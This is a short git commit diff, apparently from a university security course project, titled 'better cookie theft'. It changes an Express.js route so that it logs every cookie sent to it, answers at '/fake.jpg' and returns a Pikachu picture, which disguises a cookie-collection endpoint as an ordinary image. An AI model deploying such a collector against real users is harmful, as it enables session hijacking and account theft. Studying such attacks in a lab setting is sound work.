053b39238eb19c9d47dc7027f3c59fdcde87dd3a
Kaicheng Tan <tan95@cs.washington.edu>
2017-05-09 15:41:32 -0700

    better cookie theft

--- routes/cookie_theft.js
+++ routes/cookie_theft.js
@@ -1,10 +1,11 @@
 var express = require('express');
 var router = express.Router();
 
-router.get('/', function(req, res, next) {
+router.get('/fake.jpg', function(req, res, next) {
   console.log('\n\nCookie received by cookie theft:');
   console.log(JSON.stringify(req.cookies, null, 2), '\n\n');
-  res.send('Your cookie is parsed :)');
+  // res.send('Your cookie is parsed :)');
+  res.sendfile('public/images/pikachu.jpg');
 });
 
 module.exports = router;
